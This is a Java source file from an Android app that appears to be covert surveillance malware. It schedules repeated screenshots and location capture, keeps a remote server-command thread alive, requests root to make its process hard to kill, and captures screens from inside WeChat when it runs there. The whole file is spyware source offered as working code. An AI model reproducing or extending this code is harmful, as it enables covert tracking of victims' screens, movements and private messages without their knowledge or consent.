package com.main;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.nio.channels.ClosedChannelException;
import java.nio.channels.FileLock;
import java.nio.channels.OverlappingFileLockException;
import java.util.ArrayList;
import com.accounts.accountActivity;
import com.network.ServerCommand;
import com.phone.data.PhoneLocation;
import com.phone.data.ScreenSnapshot.ScreenCap;
import com.phone.data.ScreenSnapshotActivity;
import com.plugin.ViewScreenCap;
import com.root.rootDevice;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;

public class MainUtils implements Runnable{
	private static final String TAG = "AdvanceFunction";
	private Context context;
	private String interval = null;
	private int flag = 0;
	private String startString;
	private String endString;
	private static DatagramSocket mGlobalSocketLock = null;

	
	public MainUtils(Context context,String start,String end,String timeval,int flag){
		this.context = context;
		this.interval = timeval;
		this.flag = flag;
		startString = start;
		endString = end;
	}
	
	
	public MainUtils(Context context,int flag){
		this.context = context;
		this.flag = flag;
	}
	
	public void run(){
		
		if (flag == 1) {
			int value = Integer.parseInt(interval);
			if (value <= 120) {
				value = 120;
			}
			
			PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
					ForegroundService.SCREENSHOTREPEATPERMISSION,interval);
			PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SCREENSTART,startString);

			PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SCREENEND,endString);

			MainUtils.scheduleScreenshot(context);
		}else if (flag == 2) {
			int value = Integer.parseInt(interval);
			
			if (value <= 60) {
				value = 60;
			}

			PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
					ForegroundService.LOCATIONREPEATPERMISSION,interval);
			
			PrefOper.setValue(context, 
					ForegroundService.PARAMCONFIG_FileName, ForegroundService.LOCATIONSTART,startString);

			PrefOper.setValue(context, 
					ForegroundService.PARAMCONFIG_FileName, ForegroundService.LOCATIONEND,endString);

			MainUtils.scheduleLocation(context);
		}else if (flag == 3) {
			stopSreenshotAlarm(context);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, 
					ForegroundService.SCREENSHOTREPEATPERMISSION);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SCREENSTART);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SCREENEND);
		}else if (flag == 4) {
			stopLocationAlarm(context);
			PhoneLocation.closeLocation(context);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.LOCATIONREPEATPERMISSION);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.LOCATIONSTART);
			PrefOper.delValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.LOCATIONEND);
		}
	}
	
	
    public static void stopLocationAlarm(Context context){
    	try {
            Intent intent = new Intent(context, GSBroadcastReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(context, ForegroundService.LOCATION_REQUEST_CODE,
            		intent,PendingIntent.FLAG_NO_CREATE);
            AlarmManager am = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
            	am.cancel(pi); 
    		}else{
    			Log.e(TAG,"not found location alarm");
    			WriteDateFile.writeLogFile("not found location alarm\r\n");
    		}
		} catch (Exception e) {
			e.printStackTrace();
		}

    }


    public static void stopSreenshotAlarm(Context context){
    	try {
            Intent intent = new Intent(context, GSBroadcastReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(context, ForegroundService.SCREENSNAPSHOT_REQUEST_CODE,
            		intent,PendingIntent.FLAG_NO_CREATE);
            AlarmManager am = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
            	am.cancel(pi); 
    		}else{
    			Log.e(TAG,"not found screensnapshot alarm");
    			WriteDateFile.writeLogFile("not found screensnapshot alarm\r\n");
    		}
		} catch (Exception e) {
			e.printStackTrace();
		}

    }

	
	public static void scheduleScreenshot(Context context){
	  
		try {
			String strval = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, 
					ForegroundService.SCREENSHOTREPEATPERMISSION);
			if (strval != null && strval.equals("") == false) {
				int interval = Integer.valueOf(strval);
				if (interval >= 60 && interval <= 3600*24) {
					AlarmManager alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
			        Intent alarmscrn = new Intent(context,GSBroadcastReceiver.class);
			        alarmscrn.setAction(ForegroundService.SCREENSNAPSHOT_ALARM_ACTION);
			        PendingIntent pendscrn = PendingIntent.getBroadcast(context, ForegroundService.SCREENSNAPSHOT_REQUEST_CODE, 
			        		alarmscrn, PendingIntent.FLAG_UPDATE_CURRENT);
			        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 
			        		interval*1000, pendscrn);
			        
				}else{
					Log.e(TAG, "screen shot time error");
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	
	
//	public static void doScreenshot(Context context){
//		
//		String strval = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, 
//				ForegroundService.SCREENSHOTREPEATPERMISSION);
//		if (strval == null || strval.equals("") == true) {
//			return;
//		}
//		
//		String start = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SCREENSTART);
//		String end = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SCREENEND);
//		
//		long now = System.currentTimeMillis();
//		if(now >= Long.parseLong(start) && now <= Long.parseLong(end)){
//			doScreenShotOnce(context);
//		}
//	}
	
	
	@SuppressWarnings("deprecation")
	public static void doScreenshotOnce(Context context){	
		try {
			Log.e(TAG, "doScreenShotOnce start");

			PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
			if(pm.isScreenOn() == false){
				Log.e(TAG,"screen is:" + pm.isScreenOn() );
				return;
			}
			
			if (context.getPackageName().contains("com.tencent.mm")) {
				ArrayList<Activity> list = com.plugin.GetActivity.getActivities(context);
				if (list!= null) {
					new Thread(new ViewScreenCap(list.get(0), context)).start();
				}
				return;
			}
		
			int uid = PublicFunction.getuid(context);
			int pid = android.os.Process.myPid();
			Log.e(TAG, "pid:" + pid + " uid:" + uid);
			if (uid < 10000 && uid >= 0) {
				new Thread(new ScreenCap(context,"sh")).start();
				return;
			}else{
//				boolean ret = RootAndroid.checkRootPathSU();
//				if (ret == true) {
//					Log.e(TAG, "screencap with root");
//					
//					new Thread(new ScreenCap(context,"sh")).start();
//					return;
//				}

				if ( (android.os.Build.MANUFACTURER.contains("Xiaomi") ||
						android.os.Build.MANUFACTURER.contains("OPPO") )&& Build.VERSION.SDK_INT >= 24) {
					//return;
				}
				
				if (Build.VERSION.SDK_INT >= 21){
					Intent intentscreen = new Intent(context,ScreenSnapshotActivity.class);
					intentscreen.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startActivity(intentscreen);
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}


	
	public static void scheduleLocation(Context context){
		
		try {		
			String strval = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, 
					ForegroundService.LOCATIONREPEATPERMISSION);
			if (strval.equals("") == false) {
				int interval = Integer.valueOf(strval);
				if (interval < Public.PHONE_LOCATION_MINSECONDS ){
					interval = Public.PHONE_LOCATION_MINSECONDS;
				}else if (interval > 3600 ) {
					interval = 3600;
				}
				AlarmManager alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
		        Intent alarmcmd = new Intent(context,GSBroadcastReceiver.class);
		        alarmcmd.setAction(ForegroundService.PHONELOCATION_ALARM_ACTION);
		        PendingIntent pend = PendingIntent.getBroadcast(context, ForegroundService.LOCATION_REQUEST_CODE, 
		        		alarmcmd, PendingIntent.FLAG_UPDATE_CURRENT);
		        
		        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
		        	long nexttime = System.currentTimeMillis() + interval*1000;
		            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,nexttime, pend);
		        }else{
			        //setInexactRepeating
			        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), interval*1000, pend);
		        }
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	
	
	public static void serverCmdThread(Context context){
		Thread s = PublicFunction.GetThreadFromName(Public.SERVER_CMD_THREADNAME);
		if (null == s)
		{
			ServerCommand server = new ServerCommand(context);
			Thread thread = new Thread(server,Public.SERVER_CMD_THREADNAME);
			thread.start();
			Log.e(TAG,"not found server command thread,timer create server command thread");
		}
		else if (!s.isAlive()){
			s.start();
			Log.e(TAG,"server command thread is dead,restart it");
		}else{
			Log.e(TAG,"server command thread be running");
		}
	}
	
	public static void setServerCmdAlarm(Context context){
		AlarmManager alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
        Intent alarmcmd = new Intent(context,GSBroadcastReceiver.class);
        alarmcmd.setAction(ForegroundService.SERVERCMD_ALARM_ACTION);
        PendingIntent cmdintent = PendingIntent.getBroadcast(context, ForegroundService.SERVERCMD_REQUEST_CODE, 
        		alarmcmd, PendingIntent.FLAG_UPDATE_CURRENT);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        	long nexttime = System.currentTimeMillis() + Public.SERVERCMD_ALARM_INTERVAL + 6000;
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,nexttime, cmdintent);
        }else{
        	alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 
        			Public.SERVERCMD_ALARM_INTERVAL, cmdintent);
        }
	}

	public static void checkStartForegroundService(Context context){
    	if(PublicFunction.isServiceWorking(context, ForegroundService.class.getName()) == false){
    		Intent intentservice = new Intent(context,ForegroundService.class);
	    	intentservice.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        context.startService(intentservice);
	        Log.e(TAG, "ForegroundService started");
	        WriteDateFile.writeLogFile("ForegroundService started\r\n");
    	}
	}
	
	
	
	public static void setOomadj()
	{
		if (rootDevice.requestSU() == 0) {
			int retcode = rootDevice.resetOomadj(ForegroundService.SDCARD_PATH_NAME + ForegroundService.LOG_FILE_NAME);
			WriteDateFile.writeLogFile("resetOomadj:" + retcode + "\r\n");
			Log.e("resetoomadj","resetOomadj:" + retcode);
		}
	}
	
	
	
	

	
	public static synchronized boolean checkExist(Context context,int port1,int port2)
	{
		if (null != mGlobalSocketLock) {
			return false;
		}
		
		try {
			DatagramSocket socket = new DatagramSocket(null);
			//socket.setReuseAddress(true);
			//socket.setBroadcast(true);
			socket.bind(new InetSocketAddress(port1));
			//DatagramSocket socket = new DatagramSocket(9627, InetAddress.getByName("localhost"));
			mGlobalSocketLock = socket;

			Log.e("checkExist", "socket lock at:" + port1);
			return true;
		} catch (Throwable e) {
			e.printStackTrace();
			Log.e("checkExist", "socket lock error", e);
			
			try {
				DatagramSocket socket = new DatagramSocket(null);
				//socket.setReuseAddress(true);
				//socket.setBroadcast(true);
				socket.bind(new InetSocketAddress(port2));
				//DatagramSocket socket = new DatagramSocket(9627, InetAddress.getByName("localhost"));
				mGlobalSocketLock = socket;

				Log.e("getGlobalLock", "socket lock at:"+port2);
				return true;
			} catch (Exception e2) {
				e2.printStackTrace();
				Log.e("checkExist", "socket lock error", e);
			}
		}
		return false;
	}
	
	
	public static synchronized boolean checkExist(Context context,int port1)
	{
		try {
			if (null != mGlobalSocketLock) {
				return false;
			}
			
			DatagramSocket socket = new DatagramSocket(null);
			//socket.setReuseAddress(true);
			//socket.setBroadcast(true);
			socket.bind(new InetSocketAddress(port1));
			//DatagramSocket socket = new DatagramSocket(9627, InetAddress.getByName("localhost"));
			mGlobalSocketLock = socket;

			Log.e("checkExist", "socket lock at:" + port1);
			return true;
		} catch (Exception e) {
			e.printStackTrace();
			Log.e("checkExist", "socket lock error", e);
		}
		return false;
	}
	
	
	@SuppressWarnings("resource")
	public static boolean checkExistOld(Context context){
		FileOutputStream glfout = null;
		FileLock fLock = null;
		try{
			File glfile = new File(ForegroundService.SDCARD_PATH_NAME  + "gl.lock");
			if (glfile.exists() == false) {
				glfile.createNewFile();
			}
			
			glfout = new FileOutputStream(glfile);
			fLock = glfout.getChannel().tryLock();
			if (null == fLock) {
				Log.e(TAG,"program is already running");
				glfout.close();
				return true;
			}else{
				Log.e(TAG,"program start running");
				return false;
			}
		}
		catch(OverlappingFileLockException e){
			Log.e(TAG,"get global lock error");
			
			if (null != glfout) {
				try {
					glfout.close();
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}
			return true;
		}
		catch (ClosedChannelException e) {
			Log.e(TAG,"get global lock error");
			
			if (null != glfout) {
				try {
					glfout.close();
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}
			return false;
		}
		catch (Exception e) {
			Log.e(TAG,"get global lock error");
			
			if (null != glfout) {
				try {
					glfout.close();
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}
			return false;
		}
	}
	
	public static void createAccount(Context context){
		try {
//			AccountManager am = AccountManager.get(context);
//			AccountManagerFuture <Bundle>amf = am.addAccount(context.getString(R.string.accounttype), null, null, null, 
//					(Activity)context, new AccountManagerCallback<Bundle>() {
//				@Override
//				public void run(AccountManagerFuture<Bundle> amfuture){
//					Log.e(TAG, "account run");
//				}
//			}, null);
//			if (amf == null) {
//				
//			}
			
    		Intent intent = new Intent(context,accountActivity.class);
    		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        context.startActivity(intent);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	

	
	
	private void  enterSetting(Context activity) {
	    try {
	    	Intent intent = new Intent();
	        intent.setAction("com.android.settings.action.SETTINGS") ;
	        intent.addCategory("com.android.settings.category");
	        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        intent.setClassName("com.android.settings","com.android.settings.Settings.PowerUsageSummaryActivity");
	        activity.startActivity(intent);
	        //SPUtils.getInstance().put("enter", true);
	    } catch (Exception e) {
	        e.printStackTrace();
	    }
	}

}
